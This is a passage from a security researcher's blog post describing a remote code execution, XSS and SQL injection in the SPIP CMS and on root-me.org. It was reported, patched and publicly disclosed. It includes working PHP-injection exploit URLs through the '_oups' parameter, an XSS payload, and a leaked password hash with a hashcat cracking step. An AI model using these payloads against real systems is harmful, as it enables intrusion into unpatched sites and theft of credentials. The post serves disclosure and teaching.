+#9  recuperer_fond(prive/squelettes/contenu/article, Array ([exec] =&gt; article,[id_article] =&gt; 1,[ajouter] =&gt; non,[tri_liste_aut] =&gt; statut,[deplacer] =&gt; oui,[_oups] =&gt; '&lt;?php debug_print_backtrace();die();?&gt;',[date] =&gt; 2020-05-29 12:34:09,[date_default] =&gt; 1,[date_redac] =&gt; 2020-05-29 12:34:09,[date_redac_default] =&gt; 1,[type-page] =&gt; article,[composition] =&gt; ,[lang] =&gt; en,[espace_prive] =&gt; 1), Array ([compil] =&gt; Array ([0] =&gt; ../prive/squelettes/body.html,[1] =&gt; html_5bbf3d281bcedbb6cfa5c8fc593ec71d,[2] =&gt; ,[3] =&gt; 22,[4] =&gt; en),[ajax] =&gt; contenu,[trim] =&gt; 1), ) called at [/issue_4494/ecrire/public/evaluer_page.php(55) : eval()'d code:89]
+#10 eval() called at [/issue_4494/ecrire/public/evaluer_page.php:55]
+#11 include(/issue_4494/ecrire/public/evaluer_page.php) called at [/issue_4494/ecrire/public/assembler.php:657]
+#12 evaluer_fond(prive/squelettes/body, Array ([exec] =&gt; article,[id_article] =&gt; 1,[ajouter] =&gt; non,[tri_liste_aut] =&gt; statut,[deplacer] =&gt; oui,[_oups] =&gt; '&lt;?php debug_print_backtrace();die();?&gt;',[date] =&gt; 2020-05-29 12:34:09,[date_default] =&gt; 1,[date_redac] =&gt; 2020-05-29 12:34:09,[date_redac_default] =&gt; 1,[type-page] =&gt; article,[composition] =&gt; ,[lang] =&gt; en,[espace_prive] =&gt; 1), ) called at [/issue_4494/ecrire/inc/utils.php:3258]
+#13 recuperer_fond(prive/squelettes/body, Array ([exec] =&gt; article,[id_article] =&gt; 1,[ajouter] =&gt; non,[tri_liste_aut] =&gt; statut,[deplacer] =&gt; oui,[_oups] =&gt; '&lt;?php debug_print_backtrace();die();?&gt;',[date] =&gt; 2020-05-29 12:34:09,[date_default] =&gt; 1,[date_redac] =&gt; 2020-05-29 12:34:09,[date_redac_default] =&gt; 1,[type-page] =&gt; article,[composition] =&gt; ,[lang] =&gt; en,[espace_prive] =&gt; 1), Array ([compil] =&gt; Array ([0] =&gt; ../prive/squelettes/structure.html,[1] =&gt; html_7335c83ff55eb313d2a61dfae0443fa4,[2] =&gt; ,[3] =&gt; 9,[4] =&gt; en),[trim] =&gt; 1), ) called at [/issue_4494/ecrire/public/evaluer_page.php(55) : eval()'d code:38]
+#14 eval() called at [/issue_4494/ecrire/public/evaluer_page.php:55]
+#15 include(/issue_4494/ecrire/public/evaluer_page.php) called at [/issue_4494/ecrire/public/assembler.php:657]
+#16 evaluer_fond(prive/squelettes/structure, Array ([exec] =&gt; article,[id_article] =&gt; 1,[ajouter] =&gt; non,[tri_liste_aut] =&gt; statut,[deplacer] =&gt; oui,[_oups] =&gt; '&lt;?php debug_print_backtrace();die();?&gt;',[date] =&gt; 2020-05-29 12:34:09,[date_default] =&gt; 1,[date_redac] =&gt; 2020-05-29 12:34:09,[date_redac_default] =&gt; 1,[type-page] =&gt; article,[composition] =&gt; ,[lang] =&gt; en), ) called at [/issue_4494/ecrire/inc/utils.php:3258]
+#17 recuperer_fond(prive/squelettes/structure, Array ([exec] =&gt; article,[id_article] =&gt; 1,[ajouter] =&gt; non,[tri_liste_aut] =&gt; statut,[deplacer] =&gt; oui,[_oups] =&gt; '&lt;?php debug_print_backtrace();die();?&gt;',[date] =&gt; 2020-05-29 12:34:09,[date_default] =&gt; 1,[date_redac] =&gt; 2020-05-29 12:34:09,[date_redac_default] =&gt; 1,[type-page] =&gt; article,[composition] =&gt; ,[lang] =&gt; en), Array ([compil] =&gt; Array ([0] =&gt; ../prive/squelettes/page.html,[1] =&gt; html_2282b1b56aa2fdb0410f3f69aba04c5e,[2] =&gt; ,[3] =&gt; 1,[4] =&gt; en),[trim] =&gt; 1), ) called at [/issue_4494/ecrire/public/evaluer_page.php(55) : eval()'d code:14]
+#18 eval() called at [/issue_4494/ecrire/public/evaluer_page.php:55]
+#19 include(/issue_4494/ecrire/public/evaluer_page.php) called at [/issue_4494/ecrire/public.php:157]
+#20 include(/issue_4494/ecrire/public.php) called at [/issue_4494/ecrire/exec/fond.php:74]
+#21 include_once(/issue_4494/ecrire/exec/fond.php) called at [/issue_4494/ecrire/inc/utils.php:1572]
+#22 find_in_path(fond.php, exec/, 1) called at [/issue_4494/ecrire/inc/utils.php:151]
+#23 include_spip(exec/fond) called at [/issue_4494/ecrire/inc/utils.php:81]
+#24 charger_fonction(fond) called at [/issue_4494/ecrire/index.php:165]
+</code></pre></li>
+
+<li><p>Echo out the evaluated content to craft our payload<br />
+Yellow: What I first aimed while auditing <code>eval()</code>, safe context<br />
+Red: Where it got reflected and then, not-so-safe context</p>
+
+<pre><code class="language-html">https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;ajouter=non&amp;tri_liste_aut=statut&amp;deplacer=oui&amp;_oups='&lt;?php debug_print_backtrace();die();?&gt;
+https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;ajouter=non&amp;tri_liste_aut=statut&amp;deplacer=oui&amp;_oups=%27%3C?php%20debug_print_backtrace();die();?%3E
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/reflected_oups.jpg" alt="reflected_oups">
+<img class="img_med" src="/en/hacking/rce_on_spip_and_root_me/eval_debug.jpg" alt="eval_debug"></p></li>
+
+<li><p>Spawn a phpinfo to see what is allowed / forbidden
+<img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/phpinfo.jpg" alt="phpinfo"></p></li>
+
+<li><p>Bypass the php disable_functions policies with <code>popen</code> which wasn’t restricted // Edit, I probably just forgot to echo the result of shell_exec.. :)</p>
+
+<pre><code class="language-html">https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;ajouter=non&amp;tri_liste_aut=statut&amp;deplacer=oui&amp;_oups='&lt;?php echo fread(popen(&quot;id&quot;, &quot;r&quot;), 300);?&gt;
+https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;ajouter=non&amp;tri_liste_aut=statut&amp;deplacer=oui&amp;_oups=%27%3C?php%20echo%20fread(popen(%22id%22,%20%22r%22),%20300);?%3E
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/cmd_id.jpg" alt="cmd_id"></p></li>
+
+<li><p>Profit?!
+<img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/cmd_uname.jpg" alt="cmd_uname"></p></li>
+</ol>
+
+<blockquote>
+<p>Honestly, I never thought I would one day pwn root-me, but hey, here we are, and I&rsquo;m so frikkin&rsquo; happy! :D
+<img class="img_small" src="/en/hacking/rce_on_spip_and_root_me/happy_owl.jpg" alt="happy_owl"></p>
+</blockquote>
+
+<h1 id="is-root-me-more-secure-than-spip-itself">Is root-me more secure than spip itself?</h1>
+
+<h2 id="xss-wise">XSS wise</h2>
+
+<p>The <code>parano</code> mode was enabled, which reduces the attack surface for XSS and escapes pretty much everything. Only a few were working on root-me.
+More information about this mode here: <a href="https://www.spip.net/en_article4948.html">https://www.spip.net/en_article4948.html</a></p>
+
+<pre><code class="language-html">https://www.root-me.org/ecrire/?exec=plan&amp;null=lalu' onmouseover=alert(domain) style='width:9999999px;height:9999999px;' foo=
+https://www.root-me.org/ecrire/?exec=plan&amp;null=lalu%27%20onmouseover=alert(domain)%20style=%27width:9999999px;height:9999999px;%27%20foo=
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/xss_null_rootme.jpg" alt="xss_null_rootme"></p>
+
+<h2 id="sqli-wise">SQLi wise</h2>
+
+<p>I used one SQLi to leak information on root-me, such as my user entry in their database. I was quite perplex to learn that they were still using md5crypt, which is now considered as weak and can easily be bruteforced with hashcat or john.</p>
+
+<pre><code>SELECT * FROM `spip_auteurs` WHERE email LIKE 'loukajc@gmail.com' [1]:
+????CENSORED????, ????CENSORED????, , , Black Hat? Hell no! Black Cat. , , 0, , , loukajc@gmail.com, 2020-05-22 18:42:10, $1$FmHtJAcr$bkMz6D8B3P0oYCLKCXJVt., 18343, non, fr, develooper, ????CENSORED????, 2020-05-22 18:42:10, , , , , , Laluka, ThinkLoveShare, 523fc199643d2f0f0d71599bce5ebf1d732512a777ba9f8af656097445294023, , a:5:{s:7:&quot;couleur&quot;;s:1:&quot;9&quot;;s:7:&quot;display&quot;;s:1:&quot;1&quot;;s:18:&quot;display_navigation&quot;;s:21:&quot;navigation_sans_icone&quot;;s:14:&quot;display_outils&quot;;s:3:&quot;oui&quot;;s:3:&quot;cnx&quot;;s:0:&quot;&quot;;}, , 1comite, https://thinkloveshare.com, non
+</code></pre>
+
+<p>My password wasn’t in a wordlist, so I added it (testing purpose). And yes, I changed it. :)</p>
+
+<p>Here I run <code>hashcat</code>, which is on my machine aliased to a docker alias:</p>
+
+<pre><code class="language-bash">docker run --rm -it -v $(pwd):/host dockit dizcza/docker-hashcat:intel-cpu hashcat
+</code></pre>
+
+<p><img class="img_big" src="/en/hacking/rce_on_spip_and_root_me/hashcat.jpg" alt="hashcat"></p>
+
+<p>After discussing these issues with the admins, md5crypt has been removed. They were actually already using sha256, md5crypt being only forgotten legacy and is now gone! <br />
+Another security feature has been added and enforced for admins: GPG</p>
+
+<h1 id="timeline-dd-mm-yyy">Timeline - DD/MM/YYY</h1>
+
+<ul>
+<li>20/03/2020: New idea in mind: what about a RCE on root-me.org?</li>
+<li>14/05/2020: Dockerized spip setup, first XSS. Getting motivated takes time, right?</li>
+<li>15/05/2020: Initial contact with Spip &amp; Root-Me, feedback on a bulk of xss</li>
+<li>17/05/2020: Still in touch, first SQLi reported</li>
+<li>XX/05/2020: Patch for many XSS and SQLi tested and validated (spip side)</li>
+<li>XX/05/2020: W00t, got a shell?! (quickly reported &amp; patched)</li>
+<li>29/09/2020: Finally <a href="https://blog.spip.net/Mise-a-jour-CRITIQUE-de-securite-SPIP-3-2-8-et-SPIP-3-1-13.html">publicly disclosed</a> by spip! :D</li>
+<li>29/09/2020: Article published! Yataaaa! <code>\o/</code></li>
+<li>01/10/2020: Root-me&rsquo;s <a href="https://www.root-me.org/fr/Informations/Faiblesses-decouvertes/">WallOfFame</a> has been updated :)</li>
+</ul>
+
+<p>You can find the release note here : <a href="https://blog.spip.net/Mise-a-jour-CRITIQUE-de-securite-SPIP-3-2-8-et-SPIP-3-1-13.html">https://blog.spip.net/Mise-a-jour-CRITIQUE-de-securite-SPIP-3-2-8-et-SPIP-3-1-13.html</a></p>
+
+<h1 id="conclusion">Conclusion?</h1>
+
+<ol>
+<li>Nothing is as safe as it seems</li>
+<li>Don’t rush, read code, read more code</li>
+<li>Code stuff, build tools, moaaarrrr tools</li>
+<li>Have fun, &ldquo;waste&rdquo; nights, everything’s gonna be alright.</li>
+</ol>
+
+<h1 id="last-words">Last words ?</h1>
+
+<p>The patch. I do the patch often. I really like practicing the patch. Do you?</p>
+
+<p><a href="https://github.com/spip/SPIP/blob/0394b44774555ae8331b6e65e35065dfa0bb41e4/prive/formulaires/editer_liens.php#L131">https://github.com/spip/SPIP/blob/0394b44774555ae8331b6e65e35065dfa0bb41e4/prive/formulaires/editer_liens.php#L131</a></p>
+
+<p><img class="img_med" src="/en/hacking/rce_on_spip_and_root_me/the_patch.png" alt="the_patch"></p>
+
+<h1 id="kudos">Kudos</h1>
+
+<p>Once again, thanks goes to <a href="https://twitter.com/0nemask">0nemask</a>, <a href="https://twitter.com/AMTraaaxX">Sicarius</a>, <a href="https://twitter.com/w_levin">m_101</a>, <a href="https://twitter.com/hugow_vincent">Hugow</a>, and <a href="https://twitter.com/Drastdevix">Drastdevix</a> for proofreading this article, and for bearing with me spamming with random findings at 4am. <code>(҂⌣̀_⌣́)</code></p>
+
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/hacking/a_helping_hand/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">A Helping Hand</span>
+    </a>
+    
+    
+    <a href="/hacking/ssrf_to_rce_with_jolokia_and_mbeans/" class="post--navigation-next">
+      <span class="navigation-tittle">SSRF to RCE with Jolokia and MBeans</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-128985075-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
